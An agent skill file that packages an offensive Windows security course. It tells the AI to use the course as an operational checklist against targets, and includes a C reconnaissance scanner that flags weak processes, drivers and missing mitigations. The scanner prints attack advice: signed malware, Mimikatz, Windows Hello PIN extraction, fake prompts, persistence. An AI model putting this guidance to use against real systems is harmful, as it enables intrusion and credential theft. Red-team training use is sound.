---
name: offensive-windows-boundaries
description: 'Windows security boundary taxonomy and attack surface enumeration: kernel/user
  boundary, sandbox boundaries (LPAC, AppContainer), COM/RPC boundaries, hypervisor
  boundary, trust level transitions. Use when planning privilege escalation paths,
  sandbox escapes, or understanding Windows security architecture.'
---

# SKILL: Week 7: Defeating Windows Security Boundaries

## Metadata
- **Skill Name**: offensive-windows-boundaries
- **Folder**: offensive-windows-boundaries
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/7-windows-boundaries.md

## Description
Windows security boundary taxonomy and attack surface enumeration: kernel/user boundary, sandbox boundaries (LPAC, AppContainer), COM/RPC boundaries, hypervisor boundary, trust level transitions. Use when planning privilege escalation paths, sandbox escapes, or understanding Windows security architecture.

## Trigger Phrases
Use this skill when the conversation involves any of:
`Windows boundaries, security boundary, kernel user boundary, sandbox escape, AppContainer, LPAC, COM boundary, RPC boundary, hypervisor, Hyper-V, privilege escalation, trust level`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Week 7: Defeating Windows Security Boundaries

## Overview

_created by AnotherOne from @Pwn3rzs Telegram channel_.

Week 6 taught you how mitigations work defensively.
You'll learn to bypass the OS security _policies and features_ that prevent your code from running, your processes from accessing protected resources, and your actions from being logged.
This is distinct from Week 8, which teaches you how to bypass _exploit mitigations_ (DEP, ASLR, CFG) once your code is already running.

> **Week 7 vs Week 8 - The Key Distinction**:
>
> - **Week 7** answers: _"Can my code execute at all?"_ - bypass AMSI, WDAC, ASR, AppContainers, integrity levels, PPL, ETW telemetry
> - **Week 8** answers: _"Can my exploit succeed?"_ - bypass DEP, ASLR, stack cookies, CFG/XFG, heap safe-unlinking

**This Week's Focus**:

- Offensive reconnaissance and mitigation fingerprinting
- AMSI bypass and script-based attack techniques
- Protected Process Light (PPL) exploitation
- Sandbox, integrity level, and AppContainer bypass
- WDAC and Attack Surface Reduction (ASR) bypass
- ETW manipulation and telemetry blinding
- Kernel driver interaction fundamentals (preparation for Week 11)

**Prerequisites**:

- Completed Week 6: Understanding Modern Windows Mitigations
- Week 5: Basic exploitation techniques (stack overflow, ROP, heap)
- Familiarity with WinDbg, x64dbg, and IDA/Ghidra
- C/C++, Python, and assembly knowledge

### Week 7 Deliverables

By the end of this week, you should have completed:

- [ ] **Recon Tool**: Built a mitigation fingerprinting tool
- [ ] **AMSI Bypass**: Implemented working AMSI bypass techniques
- [ ] **PPL Research**: Documented PPL bypass vectors
- [ ] **Sandbox Escape**: Bypassed AppContainer or integrity level restrictions
- [ ] **WDAC/ASR Bypass**: Demonstrated at least one WDAC and one ASR bypass
- [ ] **ETW Blinding**: Implemented ETW provider patching to suppress telemetry
- [ ] **Driver IOCTL Lab**: Loaded a test driver, sent an IOCTL, set a kernel breakpoint (Week 11 prep)

## Day 1: Offensive Reconnaissance & Mitigation Fingerprinting

- **Goal**: Master target enumeration - fingerprint system and process mitigations to identify attack vectors.
- **Activities**:
  - _Reading_:
    - [Windows Exploit Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference) - Official mitigation documentation
    - [Process Mitigation Policies](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy)
    - [Override Process Mitigations via Policy](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/override-mitigation-options-for-app-related-security-policies)
  - _Online Resources_:
    - [DEFCON 27 - Exploiting Windows Exploit Mitigation for ROP Exploits](https://www.youtube.com/watch?v=gIJOtP1AC3A)
    - [Sandbox Mitigations](https://troopers.de/media/filer_public/f6/07/f6076037-85e0-42b7-9a51-507986edafce/the_joy_of_sandbox_mitigations_export.pdf)
    - [Offensive Windows Internals](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet)
  - _Tool Setup_:
    - Process Hacker / System Informer
    - WinDbg Preview with mitigation inspection scripts
    - PE-bear / pestudio for binary analysis
  - _Exercise_:
    - Build comprehensive mitigation scanner
    - Enumerate all protected processes on target
    - Identify legacy/unprotected binaries for exploitation

### Deliverables

- [ ] Build a comprehensive mitigation scanner
- [ ] Fingerprint process-level protections remotely
- [ ] Identify unprotected/legacy binaries on target
- [ ] Map kernel mitigation status

### Target Mitigation Landscape

```text
┌─────────────────────────────────────────────────────────────────┐
│              Offensive Reconnaissance: What to Enumerate        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SYSTEM-LEVEL                    PROCESS-LEVEL                  │
│  ─────────────                   ─────────────                  │
│  ┌──────────────┐               ┌──────────────┐                │
│  │ VBS/HVCI     │               │ DEP/NX       │                │
│  │ WDAC/CI      │               │ ASLR         │                │
│  │ Secure Boot  │               │ CFG/XFG      │                │
│  │ Credential   │               │ CET/Shadow   │                │
│  │   Guard      │               │ ACG          │                │
│  │ KDP          │               │ CIG          │                │
│  │ KASLR        │               │ Child Process│                │
│  └──────────────┘               └──────────────┘                │
│         │                              │                        │
│         ▼                              ▼                        │
│  Determines:                    Determines:                     │
│  - Kernel exploit              - Shellcode execution            │
│    feasibility                 - Code injection                 │
│  - Driver loading              - ROP requirements               │
│  - Credential theft            - Process hollowing              │
│                                                                 │
│  ATTACK SURFACE MAPPING                                         │
│  ─────────────────────                                          │
│  ├── Unprotected legacy binaries (no ASLR/DEP)                  │
│  ├── Signed but vulnerable drivers (BYOVD)                      │
│  ├── Processes running without ACG/CFG                          │
│  └── Kernel version -> known vulnerabilities                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mitigation Scanner

This scanner enumerates security boundaries on a Windows target. **Why this matters**: Before exploiting a target, you need to know which mitigations are active.

```c
// unified_recon.c
// Combines system, process, binary, and policy analysis
// Compile: cl src\unified_recon.c /Fe:bin\unified_recon.exe advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// PE DLL Characteristics flags
#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA    0x0020
#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE       0x0040
#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT          0x0100
#define IMAGE_DLLCHARACTERISTICS_NO_SEH             0x0400
#define IMAGE_DLLCHARACTERISTICS_GUARD_CF           0x4000

void CheckSystemMitigations() {
    printf("\n=== SYSTEM-LEVEL MITIGATIONS ===\n\n");

    // Check VBS/HVCI via registry (more reliable than WMI)
    printf("[*] Checking VBS/HVCI status...\n");
    HKEY hKey;
    DWORD vbsEnabled = 0, hvciEnabled = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "EnableVirtualizationBasedSecurity", NULL, NULL, (LPBYTE)&vbsEnabled, &size);
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "Enabled", NULL, NULL, (LPBYTE)&hvciEnabled, &size);
        RegCloseKey(hKey);
    }

    printf("    VBS: %s\n", vbsEnabled ? "ENABLED" : "Disabled");
    printf("    HVCI: %s\n", hvciEnabled ? "ENABLED" : "Disabled");

    if (hvciEnabled) {
        printf("    [!] HVCI blocks unsigned kernel drivers\n");
        printf("    [*] Attack: Need signed vulnerable driver (BYOVD)\n");
    } else {
        printf("    [+] HVCI disabled - unsigned drivers can load\n");
    }

    // Check Secure Boot via firmware variable
    printf("\n[*] Checking Secure Boot...\n");
    DWORD secureBootEnabled = 0;
    size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "UEFISecureBootEnabled", NULL, NULL, (LPBYTE)&secureBootEnabled, &size);
        RegCloseKey(hKey);
        printf("    Secure Boot: %s\n", secureBootEnabled ? "ENABLED" : "Disabled");
    } else {
        printf("    Secure Boot: Unable to determine (may not be UEFI)\n");
    }

    // Check KASLR status (kernel base randomization)
    printf("\n[*] Checking KASLR (kernel base varies per boot)...\n");
    printf("    Note: KASLR leaks restricted in Win 24H2+ without SeDebugPrivilege\n");
    printf("    KASLR is enabled by default on modern Windows\n");

    // Check Credential Guard
    printf("\n[*] Checking Credential Guard...\n");
    DWORD credGuard = 0;
    size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "LsaCfgFlags", NULL, NULL, (LPBYTE)&credGuard, &size);
        RegCloseKey(hKey);

        if (credGuard & 1) {
            printf("    Credential Guard: ENABLED\n");
            printf("    [!] Mimikatz credential dumping will FAIL\n");
        } else {
            printf("    Credential Guard: Disabled\n");
            printf("    [+] Mimikatz can dump credentials\n");
        }
    }
}

void CheckProcessMitigations(DWORD pid, const char* procName) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return;

    printf("\n[%s (PID: %d)]\n", procName, pid);

    // DEP
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &depPolicy, sizeof(depPolicy))) {
        printf("  DEP: %s%s\n",
            depPolicy.Enable ? "ON" : "OFF",
            depPolicy.Permanent ? " (Permanent)" : "");
    }

    // ASLR
    PROCESS_MITIGATION_ASLR_POLICY aslrPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslrPolicy, sizeof(aslrPolicy))) {
        printf("  ASLR: BottomUp=%d HighEntropy=%d ForceRelocate=%d\n",
            aslrPolicy.EnableBottomUpRandomization,
            aslrPolicy.EnableHighEntropy,
            aslrPolicy.EnableForceRelocateImages);
    }

    // ACG (Dynamic Code)
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY acgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy, &acgPolicy, sizeof(acgPolicy))) {
        printf("  ACG: %s\n", acgPolicy.ProhibitDynamicCode ? "ON (No dynamic code)" : "OFF");
    }

    // CFG
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfgPolicy, sizeof(cfgPolicy))) {
        printf("  CFG: %s StrictMode=%d\n",
            cfgPolicy.EnableControlFlowGuard ? "ON" : "OFF",
            cfgPolicy.StrictMode);
    }

    CloseHandle(hProcess);
}

void FindWeakProcesses() {
    printf("\n=== HUNTING WEAK PROCESSES ===\n");
    printf("[*] Looking for processes WITHOUT mitigations (exploitation targets)...\n\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    if (Process32First(hSnapshot, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            PROCESS_MITIGATION_DEP_POLICY dep = {0};
            PROCESS_MITIGATION_ASLR_POLICY aslr = {0};
            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {0};

            GetProcessMitigationPolicy(hProc, ProcessDEPPolicy, &dep, sizeof(dep));
            GetProcessMitigationPolicy(hProc, ProcessASLRPolicy, &aslr, sizeof(aslr));
            GetProcessMitigationPolicy(hProc, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));

            // Flag if missing critical mitigations
            if (!dep.Enable || !aslr.EnableBottomUpRandomization || !cfg.EnableControlFlowGuard) {
                printf("[!] WEAK: %s (PID %d) - DEP:%d ASLR:%d CFG:%d\n",
                    pe.szExeFile, pe.th32ProcessID,
                    dep.Enable, aslr.EnableBottomUpRandomization, cfg.EnableControlFlowGuard);
            }

            CloseHandle(hProc);
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void EnumerateDrivers() {
    printf("\n=== DRIVER ENUMERATION (BYOVD Targets) ===\n");
    printf("[*] Enumerating loaded kernel drivers...\n\n");

    // Query drivers via registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        DWORD index = 0;
        char subKeyName[256];
        DWORD subKeyLen;
        int driverCount = 0;

        printf("%-30s %-10s %s\n", "Driver Name", "Type", "Path");
        printf("%-30s %-10s %s\n", "===========", "====", "====");

        while (1) {
            subKeyLen = sizeof(subKeyName);
            if (RegEnumKeyExA(hKey, index++, subKeyName, &subKeyLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
                break;

            HKEY hSubKey;
            char fullPath[512];
            snprintf(fullPath, sizeof(fullPath), "SYSTEM\\CurrentControlSet\\Services\\%s", subKeyName);

            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                DWORD type = 0;
                DWORD size = sizeof(DWORD);

                if (RegQueryValueExA(hSubKey, "Type", NULL, NULL, (LPBYTE)&type, &size) == ERROR_SUCCESS) {
                    // Type 1 = Kernel driver
                    if (type == 1) {
                        char imagePath[512] = {0};
                        size = sizeof(imagePath);
                        RegQueryValueExA(hSubKey, "ImagePath", NULL, NULL, (LPBYTE)imagePath, &size);

                        printf("%-30s %-10s %s\n", subKeyName, "Kernel", imagePath);
                        driverCount++;

                        if (driverCount >= 20) {  // Limit output
                            printf("\n[*] Showing first 20 drivers. Total may be higher.\n");
                            break;
                        }
                    }
                }
                RegCloseKey(hSubKey);
            }
        }
        RegCloseKey(hKey);
    }

    printf("\n[*] Check against vulnerable driver list:\n");
    printf("    https://www.loldrivers.io/\n");
    printf("    https://github.com/magicsword-io/LOLDrivers\n");
}

// XFG (eXtended Flow Guard) - finer-grained CFI than CFG

void CheckXFGStatus(HANDLE hProcess, const char* procName) {
    /*
    XFG (eXtended Flow Guard) Detection:
    =====================================
    XFG improves on CFG by using type-based hashes for indirect calls.

    Detection methods:
    1. Check PE header for XFG metadata
    2. Look for __guard_xfg_* symbols
    3. Check if process has XFG-aware imports

    Attack implications:
    - XFG makes CFG bypass harder
    - Need type-compatible function for exploit
    - Data-only attacks still work
    */

    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfgPolicy, sizeof(cfgPolicy))) {
        printf("  XFG Analysis:\n");
        printf("    CFG Enabled: %s\n", cfgPolicy.EnableControlFlowGuard ? "YES" : "NO");
        printf("    Export Suppression: %s\n", cfgPolicy.EnableExportSuppression ? "YES" : "NO");
        printf("    Strict Mode: %s\n", cfgPolicy.StrictMode ? "YES" : "NO");

        if (cfgPolicy.EnableControlFlowGuard && cfgPolicy.StrictMode) {
            printf("    [!] Likely XFG-enabled (strict CFG + export suppression)\n");
            printf("    [*] Attack: Need type-compatible gadgets for bypass\n");
        }
    }
}

void CheckCETShadowStack(HANDLE hProcess, const char* procName) {
    /*
    CET Shadow Stack Detection:
    ===========================
    Hardware-enforced return address protection (Intel 11th gen+)

    Shadow stack keeps copy of return addresses in protected memory.
    ROP attacks fail because RET validates against shadow stack.

    Bypass vectors:
    1. JOP (Jump-Oriented Programming) - doesn't use RET
    2. COP (Call-Oriented Programming)
    3. Find code without CET (legacy binaries)
    4. Disable CET via kernel exploit
    */

    PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY cetPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessUserShadowStackPolicy, &cetPolicy, sizeof(cetPolicy))) {
        printf("  CET Shadow Stack:\n");
        printf("    Enabled: %s\n", cetPolicy.EnableUserShadowStack ? "YES" : "NO");
        printf("    Strict Mode: %s\n", cetPolicy.EnableUserShadowStackStrictMode ? "YES" : "NO");
        printf("    Block Non-CET Binaries: %s\n", cetPolicy.BlockNonCetBinaries ? "YES" : "NO");
        printf("    IP Validation: %s\n", cetPolicy.SetContextIpValidation ? "YES" : "NO");

        if (cetPolicy.EnableUserShadowStack) {
            printf("    [!] ROP will FAIL - shadow stack validates returns\n");
            printf("    [*] Attack: Use JOP/COP or find non-CET modules\n");

            if (!cetPolicy.BlockNonCetBinaries) {
                printf("    [+] Non-CET binaries allowed - find legacy DLLs\n");
            }
        } else {
            printf("    [+] CET disabled - ROP attacks viable\n");
        }
    } else {
        printf("  CET Shadow Stack: Not supported or access denied\n");
    }
}

void CheckARM64PAC() {
    /*
    ARM64 Pointer Authentication (PAC):
    ====================================
    Signs pointers with cryptographic signature in unused bits.
    Available on ARM64 Windows 11 and ARM Linux/macOS.

    PAC keys:
    - APIA/APIB: Instruction pointers (return addresses)
    - APDA/APDB: Data pointers
    - APGA: Generic authentication

    Bypass vectors:
    1. PAC oracle to brute-force signature
    2. Pointer substitution attacks
    3. Find code path that doesn't validate
    4. Kernel exploit to leak/forge keys
    */

    printf("\n=== ARM64 PAC Detection ===\n");

    #ifdef _M_ARM64
    // Check if running on ARM64 Windows
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);

    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        printf("[*] Running on ARM64 architecture\n");

        // Check for PAC support via IsProcessorFeaturePresent
        // PF_ARM_V83_LRCPC_INSTRUCTIONS_AVAILABLE (32) indicates ARMv8.3+
        if (IsProcessorFeaturePresent(32)) {
            printf("[!] ARMv8.3+ detected - PAC likely supported\n");
            printf("[*] Attack implications:\n");
            printf("    - Return addresses are signed (PACIA/PACIB)\n");
            printf("    - ROP gadgets need valid PAC signatures\n");
            printf("    - Look for PAC signing oracles or key leaks\n");
        }
    }
    #else
    printf("[*] Not ARM64 - PAC not applicable\n");
    printf("[*] To test ARM64 PAC: Use Windows on ARM or ARM Linux/macOS\n");
    #endif
}

DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                DWORD pid = pe.th32ProcessID;
                CloseHandle(hSnapshot);
                return pid;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

void CheckKASANStatus() {
    /*
    Windows KASAN (Kernel Address Sanitizer):
    =========================================
    detects kernel memory bugs.

    Impact on exploitation:
    - UAF and OOB bugs trigger Bug Check 0x1F2
    - Makes reliability testing harder
    - Detects heap spray corruption

    For researchers:
    - Use KASAN to find bugs faster
    - Production systems usually don't have it
    */

    printf("\n=== Windows KASAN Detection ===\n");

    // Check registry for KASAN enablement
    HKEY hKey;
    DWORD kasanEnabled = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        RegQueryValueExA(hKey, "KasanEnabled", NULL, NULL,
            (LPBYTE)&kasanEnabled, &size);
        RegCloseKey(hKey);
    }

    printf("[*] KASAN Status: %s\n", kasanEnabled ? "ENABLED" : "Disabled/Not configured");

    if (kasanEnabled) {
        printf("[!] KASAN is enabled - memory bugs will trigger BSOD\n");
        printf("[*] This is likely a development/test system\n");
        printf("[*] Exploitation reliability will be harder to achieve\n");
    } else {
        printf("[*] KASAN not enabled - standard exploitation applies\n");
        printf("[*] UAF/OOB exploitation possible without immediate crash\n");
    }
}

void CheckKernelCET() {
    /*
    Kernel-mode CET Shadow Stack:
    =============================
    Protects kernel return addresses from ROP attacks.

    Impact:
    - Kernel ROP chains will fail
    - Need different primitive (JOP, data-only)
    - BYOVD still works if driver doesn't use ROP
    */

    printf("\n=== Kernel CET Shadow Stack ===\n");

    // Query via NtQuerySystemInformation or check feature flags
    // For now, use registry/build check

    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    RtlGetVersion_t RtlGetVersion = (RtlGetVersion_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    printf("[*] Build: %d\n", osvi.dwBuildNumber);

    if (osvi.dwBuildNumber >= 22621) {  // Win11 22H2+
        printf("[*] Build supports kernel CET\n");

        // Check via registry for hypervisor settings
        HKEY hKey;
        char cetEnabled[256] = {0};
        DWORD size = sizeof(cetEnabled);

        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {

            if (RegQueryValueExA(hKey, "CetEnabled", NULL, NULL, (LPBYTE)cetEnabled, &size) == ERROR_SUCCESS) {
                printf("[*] Kernel CET Registry: %s\n", cetEnabled);
            }
            RegCloseKey(hKey);
        }

        printf("\n[*] If kernel CET enabled:\n");
        printf("    - Kernel ROP attacks blocked\n");
        printf("    - Need JOP/data-only techniques\n");
        printf("    - Or exploit driver that doesn't use ROP internally\n");
    } else {
        printf("[+] Build predates kernel CET - kernel ROP viable\n");
    }
}

void CheckSmartAppControl() {
    /*
    Smart App Control (SAC):
    ========================
    blocks untrusted applications.

    States:
    - 0: Off (disabled, cannot re-enable without reinstall)
    - 1: On (enforcing, blocks untrusted apps)
    - 2: Evaluation (learning mode)

    Bypass vectors:
    - Signed malware with valid certificates
    - LNK file bypass (CVE-2024-38217)
    - LOLBins (trusted Microsoft binaries)
    - Script execution (PowerShell not blocked by default)
    - DLL sideloading into trusted processes
    */

    printf("\n=== Smart App Control (SAC) ===\n");

    HKEY hKey;
    DWORD sacState = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Policy",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "VerifiedAndReputablePolicyState", NULL, NULL,
            (LPBYTE)&sacState, &size) == ERROR_SUCCESS) {

            switch (sacState) {
                case 0:
                    printf("[+] SAC: Disabled\n");
                    printf("[*] Unsigned executables can run freely\n");
                    break;
                case 1:
                    printf("[!] SAC: ENABLED (Enforcing)\n");
                    printf("[!] Unsigned executables will be blocked\n");
                    printf("[*] Bypass vectors:\n");
                    printf("    - Use signed malware (valid code signing cert)\n");
                    printf("    - LNK file bypass (CVE-2024-38217)\n");
                    printf("    - LOLBins (MSBuild, InstallUtil, Regsvr32)\n");
                    printf("    - Script-based payloads (PowerShell + AMSI bypass)\n");
                    printf("    - DLL sideloading into trusted processes\n");
                    break;
                case 2:
                    printf("[*] SAC: Evaluation Mode (Learning)\n");
                    printf("[*] May transition to enforcing - establish persistence now\n");
                    break;
                default:
                    printf("[?] SAC: Unknown state (%d)\n", sacState);
            }
        } else {
            printf("[*] SAC: Not available (Pre-22H2 or Server)\n");
        }

        RegCloseKey(hKey);
    } else {
        printf("[*] SAC: Not available (Pre-22H2 or Server)\n");
    }
}

void CheckAdminProtection() {
    /*
    Administrator Protection:
    =========================
    Windows Hello for admin operations.

    Impact:
    - UAC bypass alone insufficient
    - Need Windows Hello PIN/biometric credential
    - Kernel-level bypass still works (BYOVD)

    Bypass vectors:
    - Windows Hello PIN extraction (NGC folder + DPAPI)
    - Pre-authentication persistence (standard user)
    - Kernel-level token manipulation (BYOVD)
    - Physical access (offline registry modification)
    - Social engineering (fake Windows Hello prompt)
    */

    printf("\n=== Administrator Protection ===\n");

    HKEY hKey;
    DWORD adminProtection = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        RegQueryValueExA(hKey, "EnableAdminProtection", NULL, NULL,
            (LPBYTE)&adminProtection, &size);
        RegCloseKey(hKey);

        if (adminProtection == 1) {
            printf("[!] Administrator Protection: ENABLED\n");
            printf("[!] Admin operations require Windows Hello authentication\n");
            printf("[*] Bypass vectors:\n");
            printf("    - Extract Windows Hello PIN (NGC folder + DPAPI key)\n");
            printf("    - Pre-authentication persistence (standard user context)\n");
            printf("    - Kernel-level bypass (BYOVD -> token manipulation)\n");
            printf("    - Physical access (offline registry modification)\n");
            printf("    - Social engineering (fake Windows Hello prompt)\n");
        } else {
            printf("[+] Administrator Protection: Disabled\n");
            printf("[*] Standard UAC bypass techniques applicable\n");
        }
    } else {
        printf("[*] Administrator Protection: Not available (Pre-24H2)\n");
    }
}

void AnalyzePEFile(const char* filepath) {
    /*
    PE Binary Analysis:
    ===================
    Check PE headers for security mitigations.

    Flags checked:
    - DYNAMIC_BASE: ASLR enabled
    - HIGH_ENTROPY_VA: 64-bit ASLR with more entropy
    - NX_COMPAT: DEP enabled (non-executable stack/heap)
    - GUARD_CF: Control Flow Guard enabled
    - NO_SEH: SEH removed (CFG requirement)
    */

    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", filepath);
        return;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    LPVOID pBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        UnmapViewOfFile(pBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        UnmapViewOfFile(pBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    WORD dllChars = pNt->OptionalHeader.DllCharacteristics;

    printf("\n[%s]\n", filepath);
    printf("  ASLR (DYNAMICBASE):    %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ? "YES" : "NO <<<");
    printf("  High Entropy ASLR:     %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA) ? "YES" : "NO");
    printf("  DEP (NX_COMPAT):       %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) ? "YES" : "NO <<<");
    printf("  CFG (GUARD_CF):        %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_GUARD_CF) ? "YES" : "NO <<<");
    printf("  NO_SEH:                %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_NO_SEH) ? "YES" : "NO");

    // Flag as potential target if missing protections
    if (!(dllChars & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ||
        !(dllChars & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) ||
        !(dllChars & IMAGE_DLLCHARACTERISTICS_GUARD_CF)) {
        printf("  >>> POTENTIAL EXPLOITATION TARGET <<<\n");
    }

    UnmapViewOfFile(pBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

int main(int argc, char* argv[]) {
    CheckSystemMitigations();
    CheckSmartAppControl();
    CheckAdminProtection();
    FindWeakProcesses();
    EnumerateDrivers();
    CheckKernelCET();
    CheckKASANStatus();
    CheckARM64PAC();

    // Check specific high-value target
    DWORD lsassPid = GetProcessIdByName("lsass.exe");
    if (lsassPid) {
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
        if (hLsass) {
            printf("\n[LSASS.EXE Analysis]\n");
            CheckXFGStatus(hLsass, "lsass.exe");
            CheckCETShadowStack(hLsass, "lsass.exe");
            CloseHandle(hLsass);
        }
    }

    // Binary analysis if files provided
    if (argc > 1) {
        printf("\n");

        for (int i = 1; i < argc; i++) {
            AnalyzePEFile(argv[i]);
        }
    }

    printf("\n=== ATTACK PATH RECOMMENDATIONS ===\n");
    printf("1. If VBS/HVCI disabled: Kernel exploitation viable\n");
    printf("2. If weak processes found: Target for injection\n");
    printf("3. If vulnerable drivers present: BYOVD path available\n");
    printf("4. If Credential Guard off: Mimikatz will work\n");
    printf("5. If CET disabled: ROP attacks work\n");
    printf("6. If CET enabled: Use JOP/COP or find non-CET binaries\n");
    printf("7. If XFG strict: Need type-compatible function gadgets\n");
    printf("8. On ARM64 with PAC: Look for signing oracles\n");
    printf("9. If SAC enabled: Use signed malware or LOLBins\n");
    printf("10. If Admin Protection on: Extract Windows Hello PIN or use kernel bypass\n");

    return 0;
}
```

**Usage Examples:**

```bash
# System-wide reconnaissance
.\bin\unified_recon.exe

# Include binary analysis
